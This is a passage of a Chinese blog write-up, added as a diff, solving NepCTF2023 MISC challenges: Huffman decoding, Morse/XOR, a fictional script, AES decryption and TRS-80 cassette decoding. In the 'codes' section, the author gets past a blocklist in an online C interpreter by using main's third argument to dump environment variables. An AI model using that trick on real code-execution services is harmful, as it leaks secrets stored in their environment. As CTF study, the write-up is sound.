@@ -1,0 +1,1181 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="leekos">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[TOC] 【NepCTF2023】复现MISC与AI共舞的哈夫曼年轻人就要年轻，正经人谁自己写代码啊 直接用gpt写出decompress()： 12345678910111213141516171819202122232425262728293031def decompress(input_file, output_file):    with open(input_file, &amp;#x27;r">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NepCTF2023复现">
+<meta property="og:url" content="https://leekosss.github.io/2023/08/13/[NepCTF2023]%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Tranquility">
+<meta property="og:description" content="[TOC] 【NepCTF2023】复现MISC与AI共舞的哈夫曼年轻人就要年轻，正经人谁自己写代码啊 直接用gpt写出decompress()： 12345678910111213141516171819202122232425262728293031def decompress(input_file, output_file):    with open(input_file, &amp;#x27;r">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141321089.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141321145.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141415371.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141416837.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141419258.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141503509.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141503989.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141503370.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141503578.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141503949.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141508569.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141509198.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141539805.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141541119.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141602831.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141610059.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141610385.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308142103330.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308142103530.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308142102645.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151325580.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151331906.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151603744.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151605359.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151607441.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151608566.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151610295.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151615420.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151616443.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151616098.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151717948.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151718279.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151723636.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151724362.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151724768.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151851660.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151854395.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151858944.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151903575.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151939750.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151949833.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308152043132.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308152047640.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308152048936.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308152049296.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308152134601.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308161242838.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308161243577.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308161247792.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308161247889.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308161255923.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308161308574.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308161314122.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308161355332.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308161400579.png">
+<meta property="article:published_time" content="2023-08-13T13:19:28.000Z">
+<meta property="article:modified_time" content="2023-08-22T10:22:55.475Z">
+<meta property="article:author" content="leekos">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141321089.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>NepCTF2023复现 - Tranquility</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"leekosss.github.io","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tranquility</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="NepCTF2023复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-13 21:19" pubdate>
+          2023年8月13日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          62k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          516 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">NepCTF2023复现</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年8月22日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>[TOC]</p>
+<h2 id="【NepCTF2023】复现"><a href="#【NepCTF2023】复现" class="headerlink" title="【NepCTF2023】复现"></a>【NepCTF2023】复现</h2><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="与AI共舞的哈夫曼"><a href="#与AI共舞的哈夫曼" class="headerlink" title="与AI共舞的哈夫曼"></a>与AI共舞的哈夫曼</h4><p>年轻人就要年轻，正经人谁自己写代码啊</p>
+<p>直接用gpt写出<code>decompress()：</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decompress</span>(<span class="hljs-params">input_file, output_file</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-comment"># Read frequency information</span><br>        num_symbols = <span class="hljs-built_in">ord</span>(f.read(<span class="hljs-number">1</span>))<br>        frequencies = &#123;&#125;<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_symbols):<br>            byte, freq_bytes = f.read(<span class="hljs-number">1</span>)[<span class="hljs-number">0</span>], f.read(<span class="hljs-number">4</span>)<br>            freq = (freq_bytes[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">24</span>) | (freq_bytes[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">16</span>) | (freq_bytes[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">8</span>) | freq_bytes[<span class="hljs-number">3</span>]<br>            frequencies[byte] = freq<br><br>        <span class="hljs-comment"># Rebuild Huffman tree</span><br>        root = build_huffman_tree(frequencies)<br><br>        <span class="hljs-comment"># Read compressed data</span><br>        compressed_data = f.read()<br>        bit_string = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">format</span>(byte, <span class="hljs-string">&#x27;08b&#x27;</span>) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> compressed_data)<br><br>    current_node = root<br>    decompressed_data = []<br>    <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> bit_string:<br>        <span class="hljs-keyword">if</span> bit == <span class="hljs-string">&#x27;0&#x27;</span>:<br>            current_node = current_node.left<br>        <span class="hljs-keyword">else</span>:<br>            current_node = current_node.right<br><br>        <span class="hljs-keyword">if</span> current_node.char <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            decompressed_data.append(current_node.char)<br>            current_node = root<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(<span class="hljs-built_in">bytes</span>(decompressed_data))<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="codes"><a href="#codes" class="headerlink" title="codes"></a>codes</h4><blockquote>
+<p>你很会写代码吗，你会写有什么用！出来混 讲的是皮 tips:flag格式为Nepctf{},flag存在环境变量</p>
+</blockquote>
+<p>进去之后，里面是一个c语言的解释器，需要我们获得环境变量</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141321089.png" srcset="/img/loading.gif" lazyload alt="image-20230814130809551"></p>
+<p>经过测试，把一些简单的命令执行函数以及关键字给禁用掉了，没办法经过命令执行获取环境变量</p>
+<h5 id="c语言获取环境变量"><a href="#c语言获取环境变量" class="headerlink" title="c语言获取环境变量"></a>c语言获取环境变量</h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/aspnet_lyc/article/details/20548767">https://blog.csdn.net/aspnet_lyc/article/details/20548767</a></p>
+<p>在c中，main函数的前两个参数argc, argv被很多人熟悉，但main函数还有第三个参数——arge。</p>
+<p><strong>main的第三个参数里存的是系统变量,所以可以通过这个参数获得系统环境变量</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv, <span class="hljs-type">char</span>** arge)</span><br>&#123;<br>	<span class="hljs-keyword">while</span>(*arge)<br>	&#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, *arge++);<br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141321145.png" srcset="/img/loading.gif" lazyload alt="image-20230814132119081"></p>
+<h4 id="小叮弹钢琴"><a href="#小叮弹钢琴" class="headerlink" title="小叮弹钢琴"></a>小叮弹钢琴</h4><p>下载获得一个mid音乐文件，我们使用<code>Audacity</code>打开：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141415371.png" srcset="/img/loading.gif" lazyload alt="image-20230814141500333"></p>
+<p>放大之后会发现，前面一段是莫斯密码，后面一段是16进制数</p>
+<p>摩斯电码解密：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">-<span class="hljs-string">.--</span> <span class="hljs-params">---</span> <span class="hljs-string">..-</span> <span class="hljs-string">...</span> <span class="hljs-string">....</span> <span class="hljs-params">---</span> <span class="hljs-string">..-</span> <span class="hljs-string">.-..</span> -<span class="hljs-string">..</span> <span class="hljs-string">..-</span> <span class="hljs-string">...</span> . - <span class="hljs-string">....</span> <span class="hljs-string">..</span> <span class="hljs-string">...</span> - <span class="hljs-params">---</span> -<span class="hljs-string">..-</span> <span class="hljs-params">---</span> <span class="hljs-string">.-.</span> <span class="hljs-string">...</span> <span class="hljs-params">---</span> -- . - <span class="hljs-string">....</span> <span class="hljs-string">..</span> -. --.<br><br>youshouldusethistoxorsomething<br></code></pre></td></tr></table></figure>
+
+<p>你应该与一些东西异或，很明显，我们把16进制提出来之后与他异或：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0</span>x370a05303c290e045005031c2b1858473a5f052117032c39230f<span class="hljs-number">005d1e17</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141416837.png" srcset="/img/loading.gif" lazyload alt="image-20230814141632784"></p>
+<h4 id="陌生的语言"><a href="#陌生的语言" class="headerlink" title="陌生的语言"></a>陌生的语言</h4><blockquote>
+<p>A同学在回学校的路上捡到了一张纸条，你能帮帮她吗？</p>
+<p>flag格式：NepCTF{XX_XX}</p>
+<p>hint：A同学的英文名为“Atsuko Kagari”</p>
+<p>hint:flag格式请选手根据自身语感自行添加下划线</p>
+</blockquote>
+<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141419258.png" srcset="/img/loading.gif" lazyload alt="image-20230814141901762" style="zoom:50%;" />
+
+<p>给了hint：<code>Atsuko Kagari</code></p>
+<p>我们直接搜索一下：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141503509.png" srcset="/img/loading.gif" lazyload alt="image-20230814142519428"></p>
+<p>然后知道了这是一个动画：小魔女学园，然后找到了这是新月文字</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141503989.png" srcset="/img/loading.gif" lazyload alt="image-20230814143312074"></p>
+<p>百度贴吧找到对照：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141503370.png" srcset="/img/loading.gif" lazyload alt="image-20230814143713302"></p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">HEARTISYOURMAGIC</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141503578.png" srcset="/img/loading.gif" lazyload alt="image-20230814143724177"></p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">NEPNEPABELIEVING</span><br></code></pre></td></tr></table></figure>
+
+<p>凭语感拼接起来：</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">NepCTF&#123;NEPNEP_<span class="hljs-built_in">A_BELIEVING</span>_HEART_IS_YOUR_MAGIC&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="你也喜欢三月七么"><a href="#你也喜欢三月七么" class="headerlink" title="你也喜欢三月七么"></a>你也喜欢三月七么</h4><blockquote>
+<p>三月七：耶，终于来到Nepnep星球啦，让我看看正在火热进行的Hacker夺旗大赛群聊。啊！开拓者，这群名看起来怪怪的诶。 （伸出脑袋，凑近群名，轻轻的闻了一下）哇，好咸诶，开拓者你快来看看！</p>
+<p>开拓者（U_id）：(端着下巴，磨蹭了一下，眼神若有所思）这好像需要经过啥256处理一下才能得到我们需要的关键。</p>
+<p>三月七：那我们快想想怎么解开这个谜题！</p>
+<p>flag格式:NepCTF{+m+}</p>
+<p>hint:URL为压缩包密码</p>
+</blockquote>
+<p>txt文件：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">salt_lenth</span>= <span class="hljs-number">10</span> <br><span class="hljs-attr">key_lenth</span>= <span class="hljs-number">16</span> <br><span class="hljs-attr">iv</span>= <span class="hljs-number">88219</span>bdee9c396eca3c637c0ea436058 <span class="hljs-comment">#原始iv转hex的值</span><br><span class="hljs-attr">ciphertext</span>= b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc<br></code></pre></td></tr></table></figure>
+
+<p>这里根据题目描述：群名很咸，推出salt（长度为10）：<code>NepCTF2023</code></p>
+<p>经过啥256处理一下才能得到我们需要的关键：推出sha256后得到key(关键)</p>
+<p>猜测我们对<code>NepCTF2023</code>经过sha256后可以得到<code>key</code> ，取出前32位：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">dd8e671df3882c5be6423<span class="hljs-keyword">cd</span>030bd7cb6<br></code></pre></td></tr></table></figure>
+
+<p>然后AES解密&#x3D;&gt;hex解密&#x3D;&gt;base64解密：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141503949.png" srcset="/img/loading.gif" lazyload alt="image-20230814150316871"></p>
+<p><a target="_blank" rel="noopener" href="https://img1.imgtp.com/2023/07/24/yOkXWSJT.png">https://img1.imgtp.com/2023/07/24/yOkXWSJT.png</a></p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141508569.png" srcset="/img/loading.gif" lazyload alt="image-20230814150805533"></p>
+<p>星穹铁道文字：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141509198.png" srcset="/img/loading.gif" lazyload alt="image-20230814150916147"></p>
+<p>翻译一下：</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">NepCTF</span><span class="hljs-template-variable">&#123;HRP_always_likes_March_7th&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="Ez-BASIC-II"><a href="#Ez-BASIC-II" class="headerlink" title="Ez_BASIC_II"></a>Ez_BASIC_II</h4><blockquote>
+<p>穿越回 1977 年的 Lemon 赶上了世界上第一批大规模生产的个人电脑发售。经过数月努力他终于拥有了一台计算机。他迫不及待地将自己编写的 BASIC 程序分享给了 H3，但由于 Lemon 对 BASIC 语言不熟悉导致他写错了代码段。数月后他带着装有程序的磁带回到了21世纪，但你能帮他还原磁带中的程序吗？</p>
+</blockquote>
+<p>下载后得到一个录音文件</p>
+<p>我们查询一下：<code>世界上第一批大规模生产的个人电脑发售</code></p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141539805.png" srcset="/img/loading.gif" lazyload alt="image-20230814153907747"></p>
+<p><code>TRS-80</code>电脑</p>
+<p>找一个在线网站解析磁带（cassette）：<a target="_blank" rel="noopener" href="https://www.my-trs-80.com/cassette/">https://www.my-trs-80.com/cassette/</a></p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141541119.png" srcset="/img/loading.gif" lazyload alt="image-20230814154153052"></p>
+<p>把ascii提出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python">res = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.........</span><br><span class="hljs-string"><span class="hljs-meta">... </span>°°...</span><br><span class="hljs-string">..º...½..</span><br><span class="hljs-string">..¿......</span><br><span class="hljs-string">..«´°°...</span><br><span class="hljs-string">.........</span><br><span class="hljs-string">.........</span><br><span class="hljs-string">.. .°°...</span><br><span class="hljs-string">..ª...½..</span><br><span class="hljs-string">..ª...¿..</span><br><span class="hljs-string">..ªµ°¸...</span><br><span class="hljs-string">..ª......</span><br><span class="hljs-string">....°°...</span><br><span class="hljs-string">..¨......</span><br><span class="hljs-string">..¿......</span><br><span class="hljs-string">..¿......</span><br><span class="hljs-string">...½°°¸..</span><br><span class="hljs-string">.........</span><br><span class="hljs-string">..°°°°°..</span><br><span class="hljs-string">....¿....</span><br><span class="hljs-string">....¿....</span><br><span class="hljs-string">....¿....</span><br><span class="hljs-string">.........</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>res = res.split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span 